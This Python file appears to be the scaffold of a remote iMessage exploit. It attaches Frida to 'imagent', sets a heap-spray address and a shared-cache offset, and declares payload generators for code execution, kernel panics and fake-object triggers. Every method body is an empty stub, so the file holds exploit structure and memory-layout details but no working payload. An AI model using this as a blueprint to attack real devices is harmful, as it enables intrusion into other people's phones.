import frida
import random
import subprocess
import sys
import time
import os

CRASH_ELAY = 10
HEAPSPRAY_ADDR = 0x140000000
SHARED_CACHE_BASE = None
SHARED_CACHE_WRITABLE_REGION_OFFSET = 0x31acc00
TARGET_APPLE_ID = 'foo@bar.baz'

class Device:
  def __init__(self, apple_id):
    self.apple_id = apple_id
    self.ready = False
    self._delivery_receipts = 0

    session = frida.attach('imagent')
    code = open('./hook.js', 'r').read()
    script = session.create_script(code)
    script.load()

    while not self.ready:
      time.sleep(1)

  def send_message(self):
    pass

  def send_payload_to_imagent(self):
    pass

  def send_payload_to_springboard(self):
    pass

class Payloads:
  @staticmethod
  def generate_calcpop_heapspray_payload(shared_cache_base):
    pass
  
  @staticmethod
  def generate_kernelpanic_heapspray_payload(shard_cache_base):
    pass

  @staticmethod
  def generate_addr_deref_payload(addr):
    pass

  @staticmethod
  def generate_fakeobj_dealloc_trigger(addr):
    pass


class SharedCacheProfile:
  def __init__(self, zeroMap, ptrMap, tpMap):
    assert(len(zeroMap) == len(ptrMap) == len(tpMap))

    self.base = 0x180000000
    self.zeroMap = zeroMap
    self.ptrMap = ptrMap
    self.tpMap = tpMap
